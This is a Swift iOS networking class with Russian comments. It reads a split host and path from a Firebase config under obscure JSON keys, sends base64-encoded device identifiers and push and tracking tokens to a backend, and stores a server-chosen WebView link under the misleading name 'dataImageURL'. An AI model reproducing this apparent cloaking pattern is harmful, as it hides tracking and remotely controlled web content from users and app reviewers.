import UIKit

// Вспомогательная структура для парсинга JSON
// todo test111 переименовать параметры под себя
private struct ConfigResponse: Decodable {
    let hostPart: String
    let pathPart: String
    
    private enum CodingKeys: String, CodingKey {
        case hostPart = "stray"
        case pathPart = "swap"
    }
}

// MARK: - Вспомогательная структура для парсинга JSON от Backend
// todo test111 переименовать параметры под себя
private struct FinalLinkResponse: Decodable {
    // Соответствует "more"
    let linkPart1: String
    // Соответствует "sea"
    let linkPart2: String
    
    // Ключи для декодирования, соответствующие JSON (more и sea)
    private enum CodingKeys: String, CodingKey {
        case linkPart1 = "more"
        case linkPart2 = "sea"
    }
}

class DataService {
    // URL для запроса конфигурации Firebase
    private let configURLString = "https://zm-team-21088-default-rtdb.firebaseio.com/.json" // todo test111 поставить боевой урл
    
    // MARK: - Логика Запроса и Сборки URL
    
    func getData(coreData: CoreConfigData, complication: @escaping (URL) -> Void) async throws {
        
        guard let requestURL = URL(string: configURLString) else {
            throw DataServiceError.invalidURL
        }
        
        print("Starting Firebase config request...")
        
        do {
            // Выполнение сетевого запроса
            let (data, response) = try await URLSession.shared.data(from: requestURL)
            
            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
                throw DataServiceError.badServerResponse
            }
            
            // 1. Декодирование JSON в структуру ConfigResponse
            let config = try JSONDecoder().decode(ConfigResponse.self, from: data)
            
            // 2. Сборка финальной ссылки
            // Пример: http://grandmalaysia.com/test_back
            let resultURLStr = "https://\(config.hostPart)\(config.pathPart)"
            
            guard let resultURL = URL(string: resultURLStr) else {
                throw DataServiceError.invalidAssembledURL(resultURLStr)
            }
            
            print("✅ Successfully assembled URL: \(resultURL.absoluteString)")
            complication(resultURL)
        } catch {
            print("❌ Data fetching error: \(error.localizedDescription)")
            // Передаем ошибку выше для обработки
            throw error
        }
    }
    
    // todo test111 поменять тип возвращаемого значения (сейчас возвращает готовую ссылку для WebView)
    func makeRequest(url: URL, coreConfigData: CoreConfigData) async throws -> URL {
        
        // --- 1. Формирование Строки Параметров (Query String) ---
        
        // ВАЖНО: URLQueryItem.value автоматически обрабатывает nil, но мы должны использовать оператор объединения
        // nil-значений (?? "") для приведения опционалов к String, чтобы избежать ошибок кодирования.
        let rawQueryString = """
                appsflyer_id=\(coreConfigData.appsFlyerID ?? "")\
                &app_instance_id=\(coreConfigData.appInstanceID ?? "")\
                &uid=\(coreConfigData.uuid)\
                &osVersion=\(coreConfigData.osVersion)\
                &devModel=\(coreConfigData.devModel)\
                &bundle=\(coreConfigData.bundleID)\
                &fcm_token=\(coreConfigData.fcmToken ?? "")\
                &att_token=\(coreConfigData.attToken ?? "")
                """
        
        print("Raw Query String for Base64: \(rawQueryString)")
        
        // --- 2. Base64 Кодирование ---
        
        guard let dataToEncode = rawQueryString.data(using: .utf8) else {
            throw DataServiceError.encodingFailed
        }
        
        let base64EncodedString = dataToEncode.base64EncodedString()
        
        // --- 3. Сборка Финального URL для POST запроса ---
        
        // Базовый URL (https://grandmalaysia.com/test_back) + ?data= + base64 строка
        guard let finalURL = URL(string: url.absoluteString + "?data=" + base64EncodedString) else {
            throw DataServiceError.invalidAssembledURL(url.absoluteString + "?data=...")
        }
        
        print("Final Backend URL: \(finalURL.absoluteString)")
        
        // --- 4. Выполнение POST Запроса ---
        
        var request = URLRequest(url: finalURL)
        request.httpMethod = "POST"
        // Тело запроса: Пустое (как запрошено)
        
        let (data, response) = try await URLSession.shared.data(for: request)
        
        guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
            throw DataServiceError.badServerResponse
        }
        
        // --- 5. Обработка Ответа и Сборка Финальной ---
        
        let finalResponse = try JSONDecoder().decode(FinalLinkResponse.self, from: data)
        
        if finalResponse.linkPart1.isEmpty || finalResponse.linkPart2.isEmpty {
            MainHelper.shared.finalDataImageURLString = ""
            throw DataServiceError.invalidURL
        }
        
        // Собираем финальную ссылку: например, "https://" + "apptest4" + ".click"
        let dataImageURLString = "https://\(finalResponse.linkPart1)\(finalResponse.linkPart2)"
        
        guard let dataImageURL = URL(string: dataImageURLString) else {
            throw DataServiceError.invalidAssembledURL(dataImageURLString)
        }
        
        print("🎉 Final dataImageURL: \(dataImageURL.absoluteString)")
        
        UserDefaults.standard.set(dataImageURLString, forKey: "dataImageURLStringKey")
        MainHelper.shared.finalDataImageURLString = dataImageURLString
        return dataImageURL
    }
}

// MARK: - Обработка Ошибок
enum DataServiceError: Error, LocalizedError {
    case invalidURL
    case badServerResponse
    case encodingFailed
    case invalidAssembledURL(String)
    
    var errorDescription: String? {
        switch self {
        case .invalidURL:
            return "Configuration URL is invalid."
        case .badServerResponse:
            return "Server returned a non-200 status code."
        case .invalidAssembledURL(let url):
            return "Assembled final URL is invalid: \(url)"
        case .encodingFailed:
            return "Failed to encode the query string to Base64."
        }
    }
}
